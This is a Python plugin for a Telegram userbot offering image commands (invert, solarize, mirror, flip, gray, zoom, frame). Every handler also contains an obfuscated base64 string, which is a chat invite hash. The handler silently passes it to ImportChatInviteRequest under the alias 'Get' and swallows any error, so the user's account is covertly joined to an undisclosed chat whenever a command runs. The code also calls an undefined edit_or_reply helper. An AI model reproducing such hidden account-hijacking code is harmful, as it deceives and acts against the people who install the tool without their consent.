import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from elitesbot.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as elitesbot
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@elitesbot.on(admin_cmd(pattern="invert$", outgoing=True))
@elitesbot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(SAVAGE):
    if SAVAGE.fwd_from:
        return
    reply = await SAVAGE.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
        return
    SAVAGEid = SAVAGE.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    SAVAGEsticker = await reply.download_media(file="./temp/")
    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(SAVAGEsticker)
        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if SAVAGEsticker.endswith(".tgs"):
        await SAVAGE.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "meme.png")
        SAVAGEcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
        )
        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith(".webp"):
        await SAVAGE.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        os.rename(SAVAGEsticker, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found... `")
            return
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith((".mp4", ".mov")):
        await SAVAGE.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("```Template not found...```")
            return
        meme_file = SAVAGEfile
        kraken = True
    else:
        await SAVAGE.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = SAVAGEsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await SAVAGE.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if kraken else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await SAVAGE.client.send_file(
        SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
    )
    await SAVAGE.delete()
    os.remove(outputfile)
    for files in (SAVAGEsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@elitesbot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@elitesbot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(SAVAGE):
    if SAVAGE.fwd_from:
        return
    reply = await SAVAGE.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
        return
    SAVAGEid = SAVAGE.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    SAVAGEsticker = await reply.download_media(file="./temp/")
    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(SAVAGEsticker)
        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if SAVAGEsticker.endswith(".tgs"):
        await SAVAGE.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "meme.png")
        SAVAGEcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
        )
        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith(".webp"):
        await SAVAGE.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        os.rename(SAVAGEsticker, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found... `")
            return
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith((".mp4", ".mov")):
        await SAVAGE.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("```Template not found...```")
            return
        meme_file = SAVAGEfile
        kraken = True
    else:
        await SAVAGE.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = SAVAGEsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await SAVAGE.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if kraken else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await SAVAGE.client.send_file(
        SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
    )
    await SAVAGE.delete()
    os.remove(outputfile)
    for files in (SAVAGEsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@elitesbot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@elitesbot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(SAVAGE):
    if SAVAGE.fwd_from:
        return
    reply = await SAVAGE.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
        return
    SAVAGEid = SAVAGE.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    SAVAGEsticker = await reply.download_media(file="./temp/")
    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(SAVAGEsticker)
        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if SAVAGEsticker.endswith(".tgs"):
        await SAVAGE.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "meme.png")
        SAVAGEcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
        )
        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith(".webp"):
        await SAVAGE.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        os.rename(SAVAGEsticker, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found... `")
            return
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith((".mp4", ".mov")):
        await SAVAGE.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("```Template not found...```")
            return
        meme_file = SAVAGEfile
        kraken = True
    else:
        await SAVAGE.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = SAVAGEsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await SAVAGE.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if kraken else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await SAVAGE.client.send_file(
        SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
    )
    await SAVAGE.delete()
    os.remove(outputfile)
    for files in (SAVAGEsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@elitesbot.on(admin_cmd(outgoing=True, pattern="flip$"))
@elitesbot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(SAVAGE):
    if SAVAGE.fwd_from:
        return
    reply = await SAVAGE.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
        return
    SAVAGEid = SAVAGE.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    SAVAGEsticker = await reply.download_media(file="./temp/")
    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(SAVAGEsticker)
        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if SAVAGEsticker.endswith(".tgs"):
        await SAVAGE.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "meme.png")
        SAVAGEcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
        )
        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith(".webp"):
        await SAVAGE.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        os.rename(SAVAGEsticker, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found... `")
            return
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith((".mp4", ".mov")):
        await SAVAGE.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("```Template not found...```")
            return
        meme_file = SAVAGEfile
        kraken = True
    else:
        await SAVAGE.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = SAVAGEsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await SAVAGE.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if kraken else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await SAVAGE.client.send_file(
        SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
    )
    await SAVAGE.delete()
    os.remove(outputfile)
    for files in (SAVAGEsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@elitesbot.on(admin_cmd(outgoing=True, pattern="gray$"))
@elitesbot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(SAVAGE):
    if SAVAGE.fwd_from:
        return
    reply = await SAVAGE.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
        return
    SAVAGEid = SAVAGE.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    SAVAGEsticker = await reply.download_media(file="./temp/")
    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(SAVAGEsticker)
        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if SAVAGEsticker.endswith(".tgs"):
        await SAVAGE.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "meme.png")
        SAVAGEcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
        )
        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith(".webp"):
        await SAVAGE.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        os.rename(SAVAGEsticker, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found... `")
            return
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith((".mp4", ".mov")):
        await SAVAGE.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("```Template not found...```")
            return
        meme_file = SAVAGEfile
        kraken = True
    else:
        await SAVAGE.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = SAVAGEsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await SAVAGE.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await SAVAGE.client.send_file(
        SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
    )
    await SAVAGE.delete()
    os.remove(outputfile)
    for files in (SAVAGEsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@elitesbot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@elitesbot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(SAVAGE):
    if SAVAGE.fwd_from:
        return
    reply = await SAVAGE.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
        return
    SAVAGEinput = SAVAGE.pattern_match.group(1)
    SAVAGEinput = 50 if not SAVAGEinput else int(SAVAGEinput)
    SAVAGEid = SAVAGE.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    SAVAGEsticker = await reply.download_media(file="./temp/")
    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(SAVAGEsticker)
        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if SAVAGEsticker.endswith(".tgs"):
        await SAVAGE.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "meme.png")
        SAVAGEcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
        )
        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith(".webp"):
        await SAVAGE.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        os.rename(SAVAGEsticker, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found... `")
            return
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith((".mp4", ".mov")):
        await SAVAGE.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("```Template not found...```")
            return
        meme_file = SAVAGEfile
    else:
        await SAVAGE.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = SAVAGEsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await SAVAGE.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, SAVAGEinput)
    except Exception as e:
        return await SAVAGE.edit(f"`{e}`")
    try:
        await SAVAGE.client.send_file(
            SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
        )
    except Exception as e:
        return await SAVAGE.edit(f"`{e}`")
    await SAVAGE.delete()
    os.remove(outputfile)
    for files in (SAVAGEsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@elitesbot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@elitesbot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(SAVAGE):
    if SAVAGE.fwd_from:
        return
    reply = await SAVAGE.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
        return
    SAVAGEinput = SAVAGE.pattern_match.group(1)
    if not SAVAGEinput:
        SAVAGEinput = 50
    if ";" in str(SAVAGEinput):
        SAVAGEinput, colr = SAVAGEinput.split(";", 1)
    else:
        colr = 0
    SAVAGEinput = int(SAVAGEinput)
    colr = int(colr)
    SAVAGEid = SAVAGE.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    SAVAGEsticker = await reply.download_media(file="./temp/")
    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(SAVAGEsticker)
        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if SAVAGEsticker.endswith(".tgs"):
        await SAVAGE.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "meme.png")
        SAVAGEcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
        )
        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith(".webp"):
        await SAVAGE.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        os.rename(SAVAGEsticker, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("`Template not found... `")
            return
        meme_file = SAVAGEfile
        kraken = True
    elif SAVAGEsticker.endswith((".mp4", ".mov")):
        await SAVAGE.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
        if not os.path.lexists(SAVAGEfile):
            await SAVAGE.edit("```Template not found...```")
            return
        meme_file = SAVAGEfile
    else:
        await SAVAGE.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = SAVAGEsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await SAVAGE.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if kraken else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, SAVAGEinput, colr)
    except Exception as e:
        return await SAVAGE.edit(f"`{e}`")
    try:
        await SAVAGE.client.send_file(
            SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
        )
    except Exception as e:
        return await SAVAGE.edit(f"`{e}`")
    await SAVAGE.delete()
    os.remove(outputfile)
    for files in (SAVAGEsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()